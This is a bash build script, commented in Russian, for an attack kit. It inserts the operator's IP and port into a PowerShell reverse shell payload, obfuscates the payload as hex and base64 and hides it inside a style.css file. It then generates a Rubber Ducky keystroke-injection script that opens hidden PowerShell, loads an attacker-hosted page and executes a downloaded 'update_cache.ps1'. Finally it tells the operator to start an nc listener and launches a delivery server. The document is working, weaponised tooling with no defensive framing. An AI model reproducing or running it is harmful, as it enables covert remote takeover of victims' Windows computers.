#!/bin/bash
set -e

# === Выбор IP ===
echo "[*] Доступные IP адреса:" 
ips=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
select ip in $ips; do
  if [[ -n "$ip" ]]; then
    SELECTED_IP=$ip
    break
  else
    echo "[!] Выберите номер из списка."
  fi
done

echo "[*] Используем IP: $SELECTED_IP"

# === Выбор порта ===
echo -n "[*] Введите порт для reverse shell (по умолчанию 4444): "
read PORT
PORT=${PORT:-4444}
echo "[*] Используем порт: $PORT"

# === Обновление IP и порта в reverse_raw.ps1 ===
RAW="payloads/reverse_raw.ps1"
echo "[*] Обновляем IP и порт в $RAW..."
sed -i "s/\$h='.*';/\$h='${SELECTED_IP}';/" "$RAW"
sed -i "s/\$p=[0-9]\{1,5\};/\$p=${PORT};/" "$RAW"

# === Шифруем reverse_raw.ps1 → HEX ===
echo "[*] Шифруем reverse_raw.ps1 → HEX..."
python3 tools/encode_payload.py > tmp.hex

# === Вставка HEX в win11_stage1.ps1 ===
echo "[*] Вставляем HEX в win11_stage1.ps1..."
cp templates/win11_stage1.template.ps1 payloads/win11_stage1.ps1
HEX=$(cat tmp.hex)
escaped=$(printf '%s' "$HEX" | sed 's/[&/]/\\&/g')
sed -i "s|<HEX_REPLACE>|$escaped|" payloads/win11_stage1.ps1

# === Обёртка base64 в style.css ===
echo "[*] Встраиваем win11_stage1.ps1 в style.css (base64)..."
python3 tools/embed_payload.py

# === Обновление duckyscript.txt ===
echo "[*] Обновляем duckyscript.txt с IP: $SELECTED_IP..."
cat <<EOF > duckyscript.txt
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden -Command "Start-Process msedge.exe http://$SELECTED_IP:8080/decrypt.html"
ENTER
DELAY 6000
STRING powershell -w hidden -Command "\$c=Get-Content \$env:USERPROFILE\Downloads\update_cache.ps1 | Out-String; [ScriptBlock]::Create(\$c).Invoke()"
ENTER
EOF

# === Очистка временных файлов ===
rm tmp.hex

echo "[+] style.css и duckyscript.txt готовы."

# === Запуск Listner connection ===
echo "(!!!)Запусти вручную: nc -lvnp $PORT"

# === Запуск сервера ===
echo "[*] Запускаем сервер..."
echo
python3 server.py
